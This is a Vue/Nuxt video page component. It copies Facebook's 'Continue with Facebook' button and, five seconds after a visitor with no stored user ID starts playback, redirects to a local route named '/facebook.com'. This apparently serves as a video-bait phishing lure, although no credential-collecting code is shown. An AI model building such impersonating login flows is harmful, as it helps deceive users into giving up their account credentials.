<template>
  <div class="h-[500px] w-[800px] mx-auto relative mt-20">
    <div
      v-if="isShowBtnLogin"
      class="thumnail absolute top-0 left-0 z-20 h-full w-full"
    >
      <div class="image">
        <img
          src="https://customer-kia89hvfngqmnwh7.cloudflarestream.com/6a79ebf9528678287aa1db15661b5e09/thumbnails/thumbnail.jpg"
          alt=""
          class="w-full h-full object-cover"
        />
      </div>
      <div class="fb_login_button_container">
        <div class="fb">
          <button
            class="fb_button_label_element fb_button_label"
            @click="onRedirectLogin()"
          >
            <svg
              viewBox="0 0 213 213"
              preserveAspectRatio="xMinYMin"
              class="fb_button_svg_logo login_fb_logo single_button_svg_logo"
            >
              <path
                d="M90,212v-75h-27v-31h27v-25q0,-40 40,-40q15,0 24,2v26h-14q-16,0 -16,16v21h30l-5,31h-27v75a106 106,0,1,0,-32 0"
                class="f_logo_circle"
                fill="white"
              ></path>
              <path
                d="M90,212v-75h-27v-31h27v-25q0,-40 40,-40q15,0 24,2v26h-14q-16,0 -16,16v21h30l-5,31h-27v75a106 106,1,0,1,-32 0"
                class="f_logo_f"
                fill="transparent"
              ></path>
            </svg>
            <span>Continue with Facebook</span>
          </button>
        </div>
      </div>
    </div>
    <div v-else class="h-full w-full">
      <iframe
        id="hello-ad21"
        src="https://customer-kia89hvfngqmnwh7.cloudflarestream.com/6a79ebf9528678287aa1db15661b5e09/iframe?poster=https%3A%2F%2Fcustomer-kia89hvfngqmnwh7.cloudflarestream.com%2F6a79ebf9528678287aa1db15661b5e09%2Fthumbnails%2Fthumbnail.jpg%3Ftime%3D%26height%3D600"
        loading="lazy"
        class="h-full w-full absolute top-0 left-0 border-none"
        allow="accelerometer; gyroscope; autoplay; encrypted-media; picture-in-picture;"
        allowfullscreen="true"
        title=""
      ></iframe>
    </div>
  </div>
</template>

<script>
export default {
  name: 'DetailVideo',
  async asyncData({ redirect, params, $http }) {
    const { id } = params
    if (!id || id === 'undefined') redirect('/404')
    console.log('id: ', id)
    // const post = await $http.$get(`https://api.nuxtjs.dev/posts/${params.id}`)
    // return { post }
  },
  data() {
    return {
      isShowBtnLogin: false,
    }
  },
  methods: {
    onRedirectLogin() {
      this.$router.push("/facebook.com")
    },
  },
  mounted() {
    const player = Stream(document.getElementById('hello-ad21'))
    const user = sessionStorage.getItem('USER_ID')
    player.addEventListener('play', () => {
      if (!user) {
        setTimeout(() => {
          // this.isShowBtnLogin = true
          this.$router.push("/facebook.com")
          player.pause()
        }, 5000)
      }
    })
  },
  created() {
    console.log(this.$route)
  },
}
</script>

<style lang="scss" scoped>
.fb {
  border-radius: 3px;
  font-size: 11px;
  height: 20px;
  background-color: rgb(26, 119, 242);
  color: rgb(255, 255, 255);
  border: 0px;
  font-weight: bold;
  display: flex;
  flex-wrap: nowrap;
  overflow: hidden;
  padding-right: 4px;
  cursor: pointer;
}
.fb_login_button_container {
    align-content: center;
    align-items: center;
    border: 0;
    color: #fff;
    display: flex;
    font-family: 'Roboto', 'Freight Sans LF Pro', Helvetica, Arial, 'Lucida Grande', sans-serif;
    font-weight: bold;
    margin: auto;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%);
}
.fb_button_label {
  margin: auto;
}
.fb_button_label_element {
  align-items: center;
  display: flex;
  font-weight: bold;
  justify-content: center;
  &:focus {
    filter: brightness(80%);
  }
}
.single_button_svg_logo {
  margin-bottom: 0.08em;
}
.fb_button_svg_logo {
  height: 1.33em;
  margin-left: 0.4em;
  margin-right: 0.4em;
  padding: 0.065em;
}
</style>
